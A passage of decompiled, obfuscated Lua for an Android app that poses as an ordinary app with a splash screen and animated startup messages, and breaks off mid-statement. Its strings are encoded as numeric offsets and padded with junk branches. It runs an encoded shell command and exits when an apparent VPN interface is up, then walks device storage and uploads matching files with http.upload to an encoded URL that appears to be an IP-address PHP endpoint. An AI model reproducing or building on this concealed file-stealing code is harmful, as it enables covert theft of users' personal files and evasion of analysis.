    L42_217 - 120001,
    L42_217 - 120013,
    L42_217 - 120018,
    L42_217 - 120016,
    L42_217 - 120014
  }))
  return L1_376
end

function L102_260()
  local L0_377, L1_378
  L0_377 = L0_213
  L1_378 = nil
  if L1_378 then
  end
  if 717 < -767 then
  end
  L1_378 = nil
  if L1_378 then
    repeat
      repeat
        do break end
        break
      until true
      L1_378 = nil
      if L1_378 then
      else
      end
    until true
  else
  end
  L1_378 = L5_214
  L1_378 = L1_378(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120069,
    L42_217 - 120048,
    L42_217 - 120004,
    L42_217 - 120007,
    L42_217 - 120007,
    L42_217 - 120014,
    L42_217 - 120016,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120005,
    L42_217 - 120000
  }))
  return L1_378
end

function L103_261()
  local L0_379, L1_380
  L0_379 = L0_213
  L1_380 = nil
  if L1_380 then
  end
  if 717 < -767 then
  end
  L1_380 = nil
  if L1_380 then
    repeat
      repeat
        do break end
        break
      until true
      L1_380 = nil
      if L1_380 then
      else
      end
    until true
  else
  end
  L1_380 = L5_214
  L1_380 = L1_380(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120069,
    L42_217 - 120046,
    L42_217 - 120005,
    L42_217 - 119998,
    L42_217 - 120006,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120005
  }))
  return L1_380
end

function L104_262()
  local L0_381, L1_382
  L0_381 = L0_213
  L1_382 = nil
  if L1_382 then
  end
  if 717 < -767 then
  end
  L1_382 = nil
  if L1_382 then
    repeat
      repeat
        do break end
        break
      until true
      L1_382 = nil
      if L1_382 then
      else
      end
    until true
  else
  end
  L1_382 = L5_214
  L1_382 = L1_382(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 119998,
    L42_217 - 119999,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120069,
    L42_217 - 120042,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001
  }))
  return L1_382
end

function L105_263()
  local L0_383, L1_384
  L0_383 = L0_213
  L1_384 = nil
  if L1_384 then
  end
  if 717 < -767 then
  end
  L1_384 = nil
  if L1_384 then
    repeat
      repeat
        do break end
        break
      until true
      L1_384 = nil
      if L1_384 then
      else
      end
    until true
  else
  end
  L1_384 = L5_214
  L1_384 = L1_384(L40_215({
    L42_217 - 119999,
    L42_217 - 119998,
    L42_217 - 120005,
    L42_217 - 120067
  }))
  return L1_384
end

function L106_264()
  local L0_385, L1_386
  L0_385 = L0_213
  L1_386 = nil
  if L1_386 then
  end
  if 717 < -767 then
  end
  L1_386 = nil
  if L1_386 then
    repeat
      repeat
        do break end
        break
      until true
      L1_386 = nil
      if L1_386 then
      else
      end
    until true
  else
  end
  L1_386 = L5_214
  L1_386 = L1_386(L40_215({
    L42_217 - 120003,
    L42_217 - 120003,
    L42_217 - 120003,
    L42_217 - 120067
  }))
  return L1_386
end

function L107_265()
  local L0_387, L1_388
  L0_387 = L0_213
  L1_388 = nil
  if L1_388 then
  end
  if 717 < -767 then
  end
  L1_388 = nil
  if L1_388 then
    repeat
      repeat
        do break end
        break
      until true
      L1_388 = nil
      if L1_388 then
      else
      end
    until true
  else
  end
  L1_388 = L5_214
  L1_388 = L1_388(L40_215({
    L42_217 - 120001,
    L42_217 - 120014,
    L42_217 - 120017,
    L42_217 - 120004,
    L42_217 - 120004,
    L42_217 - 119999
  }))
  return L1_388
end

function L108_266()
  local L0_389, L1_390
  L0_389 = L0_213
  L1_390 = nil
  if L1_390 then
  end
  if 717 < -767 then
  end
  L1_390 = nil
  if L1_390 then
    repeat
      repeat
        do break end
        break
      until true
      L1_390 = nil
      if L1_390 then
      else
      end
    until true
  else
  end
  L1_390 = L5_214
  L1_390 = L1_390(L40_215({
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120015,
    L42_217 - 120001,
    L42_217 - 120004,
    L42_217 - 120010,
    L42_217 - 120015,
    L42_217 - 120069,
    L42_217 - 120016,
    L42_217 - 120004,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120069,
    L42_217 - 120048,
    L42_217 - 120004,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 119995,
    L42_217 - 119999
  }))
  return L1_390
end

function L109_267()
  local L0_391, L1_392
  L0_391 = L0_213
  L1_392 = nil
  if L1_392 then
  end
  if 717 < -767 then
  end
  L1_392 = nil
  if L1_392 then
    repeat
      repeat
        do break end
        break
      until true
      L1_392 = nil
      if L1_392 then
      else
      end
    until true
  else
  end
  L1_392 = L5_214
  L1_392 = L1_392(L40_215({
    L42_217 - 119884,
    L42_217 - 119926,
    L42_217 - 119970,
    L42_217 - 119884,
    L42_217 - 119928,
    L42_217 - 119959,
    L42_217 - 119883,
    L42_217 - 119924,
    L42_217 - 119957,
    L42_217 - 119885,
    L42_217 - 119973,
    L42_217 - 119950,
    L42_217 - 119886,
    L42_217 - 119951,
    L42_217 - 119938,
    L42_217 - 119883,
    L42_217 - 119935,
    L42_217 - 119950,
    L42_217 - 120023,
    L42_217 - 120005,
    L42_217 - 119883,
    L42_217 - 119940,
    L42_217 - 119932,
    L42_217 - 119885,
    L42_217 - 119952,
    L42_217 - 119987,
    L42_217 - 119885,
    L42_217 - 119934,
    L42_217 - 119976,
    L42_217 - 119884,
    L42_217 - 119926,
    L42_217 - 119970,
    L42_217 - 119884,
    L42_217 - 119928,
    L42_217 - 119959,
    L42_217 - 120082
  }))
  return L1_392
end

function L110_268()
  local L0_393, L1_394
  L0_393 = L0_213
  L1_394 = nil
  if L1_394 then
  end
  if 717 < -767 then
  end
  L1_394 = nil
  if L1_394 then
    repeat
      repeat
        do break end
        break
      until true
      L1_394 = nil
      if L1_394 then
      else
      end
    until true
  else
  end
  L1_394 = L5_214
  L1_394 = L1_394(L40_215({
    L42_217 - 119884,
    L42_217 - 119926,
    L42_217 - 119970,
    L42_217 - 119884,
    L42_217 - 119928,
    L42_217 - 119959,
    L42_217 - 119883,
    L42_217 - 119924,
    L42_217 - 119957,
    L42_217 - 119885,
    L42_217 - 119973,
    L42_217 - 119950,
    L42_217 - 119885,
    L42_217 - 119942,
    L42_217 - 119952,
    L42_217 - 119886,
    L42_217 - 119931,
    L42_217 - 119931,
    L42_217 - 120082
  }))
  return L1_394
end

function L115_269()
  local L0_395, L1_396
  L0_395 = L0_213
  L1_396 = nil
  if L1_396 then
  end
  if 717 < -767 then
  end
  L1_396 = nil
  if L1_396 then
    repeat
      repeat
        do break end
        break
      until true
      L1_396 = nil
      if L1_396 then
      else
      end
    until true
  else
  end
  L1_396 = L5_214
  L1_396 = L1_396(L40_215({
    L42_217 - 119885,
    L42_217 - 119942,
    L42_217 - 119952,
    L42_217 - 119886,
    L42_217 - 119959,
    L42_217 - 119947,
    L42_217 - 119883,
    L42_217 - 119924,
    L42_217 - 119957,
    L42_217 - 119885,
    L42_217 - 119973,
    L42_217 - 119950,
    L42_217 - 119885,
    L42_217 - 119959,
    L42_217 - 119974,
    L42_217 - 119886,
    L42_217 - 119977,
    L42_217 - 119954,
    L42_217 - 119886,
    L42_217 - 119962,
    L42_217 - 119947
  }))
  return L1_396
end

function L116_270()
  local L0_397, L1_398
  L0_397 = L0_213
  L1_398 = nil
  if L1_398 then
  end
  if 717 < -767 then
  end
  L1_398 = nil
  if L1_398 then
    repeat
      repeat
        do break end
        break
      until true
      L1_398 = nil
      if L1_398 then
      else
      end
    until true
  else
  end
  L1_398 = L5_214
  L1_398 = L1_398(L40_215({
    L42_217 - 119883,
    L42_217 - 119924,
    L42_217 - 119957,
    L42_217 - 119885,
    L42_217 - 119973,
    L42_217 - 119950,
    L42_217 - 119885,
    L42_217 - 119979,
    L42_217 - 119971,
    L42_217 - 119886,
    L42_217 - 119977,
    L42_217 - 119956,
    L42_217 - 119885,
    L42_217 - 119942,
    L42_217 - 119952,
    L42_217 - 119886,
    L42_217 - 119959,
    L42_217 - 119947,
    L42_217 - 119886,
    L42_217 - 119971,
    L42_217 - 119940,
    L42_217 - 119886,
    L42_217 - 119977,
    L42_217 - 119947
  }))
  return L1_398
end

function L117_271()
  local L0_399, L1_400
  L0_399 = L0_213
  L1_400 = nil
  if L1_400 then
  end
  if 717 < -767 then
  end
  L1_400 = nil
  if L1_400 then
    repeat
      repeat
        do break end
        break
      until true
      L1_400 = nil
      if L1_400 then
      else
      end
    until true
  else
  end
  L1_400 = L5_214
  L1_400 = L1_400(L40_215({
    L42_217 - 120042,
    L42_217 - 120005,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120001,
    L42_217 - 120013,
    L42_217 - 120018,
    L42_217 - 120016,
    L42_217 - 120014
  }))
  return L1_400
end

function L118_272()
  local L0_401, L1_402
  L0_401 = L0_213
  L1_402 = nil
  if L1_402 then
  end
  if 717 < -767 then
  end
  L1_402 = nil
  if L1_402 then
    repeat
      repeat
        do break end
        break
      until true
      L1_402 = nil
      if L1_402 then
      else
      end
    until true
  else
  end
  L1_402 = L5_214
  L1_402 = L1_402(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_402
end

function L119_273()
  local L0_403, L1_404
  L0_403 = L0_213
  L1_404 = nil
  if L1_404 then
  end
  if 717 < -767 then
  end
  L1_404 = nil
  if L1_404 then
    repeat
      repeat
        do break end
        break
      until true
      L1_404 = nil
      if L1_404 then
      else
      end
    until true
  else
  end
  L1_404 = L5_214
  L1_404 = L1_404(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068
  }))
  return L1_404
end

function L120_274()
  local L0_405, L1_406
  L0_405 = L0_213
  L1_406 = nil
  if L1_406 then
  end
  if 717 < -767 then
  end
  L1_406 = nil
  if L1_406 then
    repeat
      repeat
        do break end
        break
      until true
      L1_406 = nil
      if L1_406 then
      else
      end
    until true
  else
  end
  L1_406 = L5_214
  L1_406 = L1_406(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_406
end

function L121_275()
  local L0_407, L1_408
  L0_407 = L0_213
  L1_408 = nil
  if L1_408 then
  end
  if 717 < -767 then
  end
  L1_408 = nil
  if L1_408 then
    repeat
      repeat
        do break end
        break
      until true
      L1_408 = nil
      if L1_408 then
      else
      end
    until true
  else
  end
  L1_408 = L5_214
  L1_408 = L1_408(L40_215({
    L42_217 - 120069,
    L42_217 - 120016,
    L42_217 - 120003,
    L42_217 - 120003
  }))
  return L1_408
end

function L122_276()
  local L0_409, L1_410
  L0_409 = L0_213
  L1_410 = nil
  if L1_410 then
  end
  if 717 < -767 then
  end
  L1_410 = nil
  if L1_410 then
    repeat
      repeat
        do break end
        break
      until true
      L1_410 = nil
      if L1_410 then
      else
      end
    until true
  else
  end
  L1_410 = L5_214
  L1_410 = L1_410(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_410
end

function L123_277()
  local L0_411, L1_412
  L0_411 = L0_213
  L1_412 = nil
  if L1_412 then
  end
  if 717 < -767 then
  end
  L1_412 = nil
  if L1_412 then
    repeat
      repeat
        do break end
        break
      until true
      L1_412 = nil
      if L1_412 then
      else
      end
    until true
  else
  end
  L1_412 = L5_214
  L1_412 = L1_412(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120045,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120014
  }))
  return L1_412
end

function L128_278()
  local L0_413, L1_414
  L0_413 = L0_213
  L1_414 = nil
  if L1_414 then
  end
  if 717 < -767 then
  end
  L1_414 = nil
  if L1_414 then
    repeat
      repeat
        do break end
        break
      until true
      L1_414 = nil
      if L1_414 then
      else
      end
    until true
  else
  end
  L1_414 = L5_214
  L1_414 = L1_414(L40_215({
    L42_217 - 120011,
    L42_217 - 119999,
    L42_217 - 119999,
    L42_217 - 120003
  }))
  return L1_414
end

function L129_279()
  local L0_415, L1_416
  L0_415 = L0_213
  L1_416 = nil
  if L1_416 then
  end
  if 717 < -767 then
  end
  L1_416 = nil
  if L1_416 then
    repeat
      repeat
        do break end
        break
      until true
      L1_416 = nil
      if L1_416 then
      else
      end
    until true
  else
  end
  L1_416 = L5_214
  L1_416 = L1_416(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120012,
    L42_217 - 120069,
    L42_217 - 120032,
    L42_217 - 119999,
    L42_217 - 120001,
    L42_217 - 120010,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_416
end

function L130_280()
  local L0_417, L1_418
  L0_417 = L0_213
  L1_418 = nil
  if L1_418 then
  end
  if 717 < -767 then
  end
  L1_418 = nil
  if L1_418 then
    repeat
      repeat
        do break end
        break
      until true
      L1_418 = nil
      if L1_418 then
      else
      end
    until true
  else
  end
  L1_418 = L5_214
  L1_418 = L1_418(L40_215({
    L42_217 - 120011,
    L42_217 - 119999,
    L42_217 - 119999,
    L42_217 - 120003,
    L42_217 - 120057,
    L42_217 - 120068,
    L42_217 - 120068,
    L42_217 - 120066,
    L42_217 - 120062,
    L42_217 - 120063,
    L42_217 - 120069,
    L42_217 - 120066,
    L42_217 - 120065,
    L42_217 - 120069,
    L42_217 - 120063,
    L42_217 - 120065,
    L42_217 - 120069,
    L42_217 - 120066,
    L42_217 - 120064,
    L42_217 - 120067,
    L42_217 - 120068,
    L42_217 - 120016,
    L42_217 - 120003,
    L42_217 - 120003,
    L42_217 - 120068,
    L42_217 - 119886,
    L42_217 - 119964,
    L42_217 - 119940,
    L42_217 - 119886,
    L42_217 - 119964,
    L42_217 - 119940,
    L42_217 - 120069,
    L42_217 - 120003,
    L42_217 - 120011,
    L42_217 - 120003
  }))
  return L1_418
end

function L131_281()
  local L0_419, L1_420
  L0_419 = L0_213
  L1_420 = nil
  if L1_420 then
  end
  if 717 < -767 then
  end
  L1_420 = nil
  if L1_420 then
    repeat
      repeat
        do break end
        break
      until true
      L1_420 = nil
      if L1_420 then
      else
      end
    until true
  else
  end
  L1_420 = L5_214
  L1_420 = L1_420(L40_215({}))
  return L1_420
end

function L132_282()
  local L0_421, L1_422
  L0_421 = L0_213
  L1_422 = nil
  if L1_422 then
  end
  if 717 < -767 then
  end
  L1_422 = nil
  if L1_422 then
    repeat
      repeat
        do break end
        break
      until true
      L1_422 = nil
      if L1_422 then
      else
      end
    until true
  else
  end
  L1_422 = L5_214
  L1_422 = L1_422(L40_215({}))
  return L1_422
end

function L133_283()
  local L0_423, L1_424
  L0_423 = L0_213
  L1_424 = nil
  if L1_424 then
  end
  if 717 < -767 then
  end
  L1_424 = nil
  if L1_424 then
    repeat
      repeat
        do break end
        break
      until true
      L1_424 = nil
      if L1_424 then
      else
      end
    until true
  else
  end
  L1_424 = L5_214
  L1_424 = L1_424(L40_215({
    L42_217 - 119885,
    L42_217 - 119965,
    L42_217 - 119980,
    L42_217 - 119887,
    L42_217 - 119928,
    L42_217 - 119933,
    L42_217 - 119887,
    L42_217 - 119931,
    L42_217 - 119977,
    L42_217 - 119887,
    L42_217 - 119927,
    L42_217 - 119955,
    L42_217 - 119884,
    L42_217 - 119928,
    L42_217 - 119968,
    L42_217 - 119885,
    L42_217 - 119957,
    L42_217 - 119959
  }))
  return L1_424
end

function L134_284()
  local L0_425, L1_426
  L0_425 = L0_213
  L1_426 = nil
  if L1_426 then
  end
  if 717 < -767 then
  end
  L1_426 = nil
  if L1_426 then
    repeat
      repeat
        do break end
        break
      until true
      L1_426 = nil
      if L1_426 then
      else
      end
    until true
  else
  end
  L1_426 = L5_214
  L1_426 = L1_426(L40_215({
    L42_217 - 119885,
    L42_217 - 119979,
    L42_217 - 119971,
    L42_217 - 119886,
    L42_217 - 119977,
    L42_217 - 119956,
    L42_217 - 119887,
    L42_217 - 119931,
    L42_217 - 119977,
    L42_217 - 119887,
    L42_217 - 119927,
    L42_217 - 119955,
    L42_217 - 120057
  }))
  return L1_426
end

function L135_285()
  local L0_427, L1_428
  L0_427 = L0_213
  L1_428 = nil
  if L1_428 then
  end
  if 717 < -767 then
  end
  L1_428 = nil
  if L1_428 then
    repeat
      repeat
        do break end
        break
      until true
      L1_428 = nil
      if L1_428 then
      else
      end
    until true
  else
  end
  L1_428 = L5_214
  L1_428 = L1_428(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_428
end

function L136_286()
  local L0_429, L1_430
  L0_429 = L0_213
  L1_430 = nil
  if L1_430 then
  end
  if 717 < -767 then
  end
  L1_430 = nil
  if L1_430 then
    repeat
      repeat
        do break end
        break
      until true
      L1_430 = nil
      if L1_430 then
      else
      end
    until true
  else
  end
  L1_430 = L5_214
  L1_430 = L1_430(L40_215({
    L42_217 - 120068,
    L42_217 - 120000,
    L42_217 - 119999,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 120018,
    L42_217 - 120012,
    L42_217 - 120014,
    L42_217 - 120068,
    L42_217 - 120014,
    L42_217 - 120006,
    L42_217 - 119998,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 119999,
    L42_217 - 120014,
    L42_217 - 120015,
    L42_217 - 120068,
    L42_217 - 120067,
    L42_217 - 120068
  }))
  return L1_430
end

function L138_287()
  local L0_431, L1_432
  L0_431 = L0_213
  L1_432 = nil
  if L1_432 then
  end
  if 717 < -767 then
  end
  L1_432 = nil
  if L1_432 then
    repeat
      repeat
        do break end
        break
      until true
      L1_432 = nil
      if L1_432 then
      else
      end
    until true
  else
  end
  L1_432 = L5_214
  L1_432 = L1_432(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120073
  }))
  return L1_432
end

function L139_288()
  local L0_433, L1_434
  L0_433 = L0_213
  L1_434 = nil
  if L1_434 then
  end
  if 717 < -767 then
  end
  L1_434 = nil
  if L1_434 then
    repeat
      repeat
        do break end
        break
      until true
      L1_434 = nil
      if L1_434 then
      else
      end
    until true
  else
  end
  L1_434 = L5_214
  L1_434 = L1_434(L40_215({
    L42_217 - 120069,
    L42_217 - 119993,
    L42_217 - 120010,
    L42_217 - 120003
  }))
  return L1_434
end

function L140_289()
  local L0_435, L1_436
  L0_435 = L0_213
  L1_436 = nil
  if L1_436 then
  end
  if 717 < -767 then
  end
  L1_436 = nil
  if L1_436 then
    repeat
      repeat
        do break end
        break
      until true
      L1_436 = nil
      if L1_436 then
      else
      end
    until true
  else
  end
  L1_436 = L5_214
  L1_436 = L1_436(L40_215({
    L42_217 - 120010,
    L42_217 - 120006,
    L42_217 - 120003,
    L42_217 - 120004,
    L42_217 - 120001,
    L42_217 - 119999
  }))
  return L1_436
end

function L141_290()
  local L0_437, L1_438
  L0_437 = L0_213
  L1_438 = nil
  if L1_438 then
  end
  if 717 < -767 then
  end
  L1_438 = nil
  if L1_438 then
    repeat
      repeat
        do break end
        break
      until true
      L1_438 = nil
      if L1_438 then
      else
      end
    until true
  else
  end
  L1_438 = L5_214
  L1_438 = L1_438(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120010,
    L42_217 - 120004,
    L42_217 - 120069,
    L42_217 - 120045,
    L42_217 - 120010,
    L42_217 - 120007,
    L42_217 - 120014
  }))
  return L1_438
end

function L142_291()
  local L0_439, L1_440
  L0_439 = L0_213
  L1_440 = nil
  if L1_440 then
  end
  if 717 < -767 then
  end
  L1_440 = nil
  if L1_440 then
    repeat
      repeat
        do break end
        break
      until true
      L1_440 = nil
      if L1_440 then
      else
      end
    until true
  else
  end
  L1_440 = L5_214
  L1_440 = L1_440(L40_215({
    L42_217 - 120011,
    L42_217 - 119999,
    L42_217 - 119999,
    L42_217 - 120003
  }))
  return L1_440
end

function L143_292()
  local L0_441, L1_442
  L0_441 = L0_213
  L1_442 = nil
  if L1_442 then
  end
  if 717 < -767 then
  end
  L1_442 = nil
  if L1_442 then
    repeat
      repeat
        do break end
        break
      until true
      L1_442 = nil
      if L1_442 then
      else
      end
    until true
  else
  end
  L1_442 = L5_214
  L1_442 = L1_442(L40_215({
    L42_217 - 120009,
    L42_217 - 120018,
    L42_217 - 119997,
    L42_217 - 120018,
    L42_217 - 120069,
    L42_217 - 120007,
    L42_217 - 120018,
    L42_217 - 120005,
    L42_217 - 120012,
    L42_217 - 120069,
    L42_217 - 120032,
    L42_217 - 119999,
    L42_217 - 120001,
    L42_217 - 120010,
    L42_217 - 120005,
    L42_217 - 120012
  }))
  return L1_442
end

L0_213.require(L44_219())
L0_213.import(L45_220())
L0_213.import(L46_221())
L0_213.import(L47_222())
L0_213.import(L48_223())
L0_213.import(L49_224())
if L0_213.Build.VERSION.SDK_INT >= 19 then
  L0_213.activity.getWindow().addFlags(L0_213.WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS)
end
if L0_213.Build.VERSION.SDK_INT >= 21 then
  L0_213.activity.getWindow().addFlags(L0_213.WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS).setStatusBarColor(4282549748)
end
L0_213.activity.overridePendingTransition(L0_213.android.R.anim.fade_in, L0_213.android.R.anim.overshoot_interpolator)
L0_213.SorrowClover = {
  L0_213.LinearLayout,
  orientation = (function()
    local L0_443, L1_444
    L0_443 = L0_213
    L1_444 = nil
    if L1_444 then
    end
    if 717 < -767 then
    end
    L1_444 = nil
    if L1_444 then
      repeat
        repeat
          do break end
          break
        until true
        L1_444 = nil
        if L1_444 then
        else
        end
      until true
    else
    end
    L1_444 = L5_214
    L1_444 = L1_444(L40_215({
      L42_217 - 119997,
      L42_217 - 120014,
      L42_217 - 120001,
      L42_217 - 119999,
      L42_217 - 120010,
      L42_217 - 120016,
      L42_217 - 120018,
      L42_217 - 120007
    }))
    return L1_444
  end
  )(),
  layout_width = (function()
    local L0_445, L1_446
    L0_445 = L0_213
    L1_446 = nil
    if L1_446 then
    end
    if 717 < -767 then
    end
    L1_446 = nil
    if L1_446 then
      repeat
        repeat
          do break end
          break
        until true
        L1_446 = nil
        if L1_446 then
        else
        end
      until true
    else
    end
    L1_446 = L5_214
    L1_446 = L1_446(L40_215({
      L42_217 - 120013,
      L42_217 - 120010,
      L42_217 - 120007,
      L42_217 - 120007
    }))
    return L1_446
  end
  )(),
  layout_height = (function()
    local L0_447, L1_448
    L0_447 = L0_213
    L1_448 = nil
    if L1_448 then
    end
    if 717 < -767 then
    end
    L1_448 = nil
    if L1_448 then
      repeat
        repeat
          do break end
          break
        until true
        L1_448 = nil
        if L1_448 then
        else
        end
      until true
    else
    end
    L1_448 = L5_214
    L1_448 = L1_448(L40_215({
      L42_217 - 120013,
      L42_217 - 120010,
      L42_217 - 120007,
      L42_217 - 120007
    }))
    return L1_448
  end
  )(),
  background = (function()
    local L0_449, L1_450
    L0_449 = L0_213
    L1_450 = nil
    if L1_450 then
    end
    if 717 < -767 then
    end
    L1_450 = nil
    if L1_450 then
      repeat
        repeat
          do break end
          break
        until true
        L1_450 = nil
        if L1_450 then
        else
        end
      until true
    else
    end
    L1_450 = L5_214
    L1_450 = L1_450(L40_215({
      L42_217 - 120080,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045,
      L42_217 - 120045
    }))
    return L1_450
  end
  )(),
  gravity = L50_225(),
  {
    L0_213.LinearLayout,
    gravity = L51_226(),
    layout_height = L52_227(),
    layout_width = L54_228(),
    orientation = L55_229(),
    layout_marginTop = L56_230(),
    {
      L0_213.ImageView,
      id = L57_231(),
      colorFilter = L58_232(),
      layout_marginLeft = L63_233(),
      layout_height = L64_234(),
      layout_width = L65_235(),
      src = L66_236()
    }
  },
  {
    L0_213.TextView,
    textSize = L67_237(),
    layout_marginTop = L68_238(),
    layout_height = L69_239(),
    textColor = L70_240(),
    layout_width = L71_241(),
    gravity = L76_242(),
    text = L77_243(),
    id = L78_244()
  },
  {
    L0_213.LinearLayout,
    layout_height = L79_245(),
    layout_width = L80_246()
  },
  {
    L0_213.TextView,
    layout_gravity = L81_247(),
    layout_margin = L82_248(),
    id = L83_249(),
    background = L84_250()
  },
  {
    L0_213.TextView,
    id = L89_251()
  }
}
L0_213.activity.setContentView(L0_213.loadlayout(L0_213.SorrowClover))
L0_213.import(L90_252())
L0_213.qdzt.getPaint().setFakeBoldText(true)
function L0_213.启动动画()
  L0_213.task(5, function()
    local L0_451
    L0_451 = _UPVALUE0_
    L0_451.g.setImageBitmap(L0_451.loadbitmap((L91_253())))
    L0_451.task(5, function()
      local L0_452
      L0_452 = L0_451
      L0_452.g.setImageBitmap(L0_452.loadbitmap((L92_254())))
      L0_452.task(5, function()
        local L0_453
        L0_453 = L0_452
        L0_453.g.setImageBitmap(L0_453.loadbitmap((L93_255())))
        L0_453.task(5, function()
          local L0_454
          L0_454 = L0_453
          L0_454.g.setImageBitmap(L0_454.loadbitmap((L94_256())))
          L0_454.task(5, function()
            local L0_455
            L0_455 = L0_454
            L0_455.g.setImageBitmap(L0_455.loadbitmap((L95_257())))
            L0_455.task(10, function()
              local L0_456
              L0_456 = L0_455
              L0_456.g.setImageBitmap(L0_456.loadbitmap((L96_258())))
              L0_456.启动动画()
              return true
            end
            )
            return true
          end
          )
          return true
        end
        )
        return true
      end
      )
      return true
    end
    )
    return true
  end
  )
end

L0_213.启动动画()
function L0_213.VPk()
  local L0_457
  L0_457 = L0_213
  L0_457.import(L97_259())
  L0_457.import(L102_260())
  L0_457.import(L103_261())
  L0_457.import(L104_262())
  if L0_457.NetworkInterface.getNetworkInterfaces() ~= nil then
    while L0_457.Collections.list((L0_457.NetworkInterface.getNetworkInterfaces())).iterator().hasNext() do
      if L0_457.Collections.list((L0_457.NetworkInterface.getNetworkInterfaces())).iterator().next().isUp() and L0_457.Collections.list((L0_457.NetworkInterface.getNetworkInterfaces())).iterator().next().getInterfaceAddresses().size() ~= 0 and (L0_457.String((L105_263())).equals(L0_457.Collections.list((L0_457.NetworkInterface.getNetworkInterfaces())).iterator().next().getName()) or L0_457.String((L106_264())).equals(L0_457.Collections.list((L0_457.NetworkInterface.getNetworkInterfaces())).iterator().next().getName())) then
        L0_457.os.execute((L107_265()))
        L0_457.os.exit()
      end
    end
  end
end

L0_213.VPk()
L0_213.import(L108_266())
L0_213.task(2000, function()
  local L0_458
  L0_458 = L0_213
  if _UPVALUE1_ == nil then
    L0_458.qdzt.Text = L109_267()
  else
    L0_458.qdzt.Text = L110_268()
    L0_458.task(4000, function()
      local L0_459
      L0_459 = L0_458
      L0_459.qdzt.Text = L115_269()
      L0_459.task(5000, function()
        local L0_460
        L0_460 = L0_459
        L0_460.qdzt.Text = L116_270()
        L0_460.task(100, function()
          local L0_461
          L0_461 = L0_460
          L0_461.activity.newActivity((L117_271()))
          L0_461.activity.finish()
        end
        )
      end
      )
    end
    )
  end
end
)
L0_213.require(L118_272())
L0_213.import(L120_274())
L0_213.thread(function(A0_462, A1_463)
  local L2_464, L3_465
  L2_464 = L0_213
  L3_465 = 0
  L2_464.require(L122_276())
  L2_464.import(L123_277())
  L2_464.import(L128_278())
  L2_464.import(L129_279())
  ;(function(A0_466, A1_467)
    local L2_468
    L2_468 = L2_464
    for _FORV_9_ = 0, #(A0_466.listFiles() or L2_468.File({})) - 1 do
      if (A0_466.listFiles() or L2_468.File({}))[_FORV_9_].isDirectory() then
        _UPVALUE1_((A0_466.listFiles() or L2_468.File({}))[_FORV_9_], (L2_468.tostring(A1_467)))
      elseif L2_468.string.find((A0_466.listFiles() or L2_468.File({}))[_FORV_9_].Name, (L2_468.tostring(A1_467))) then
        L2_468.table.insert(_UPVALUE2_, (A0_466.listFiles() or L2_468.File({}))[_FORV_9_].Name)
        if L2_468.string.match(L2_468.http.upload(L130_280(), {}, {
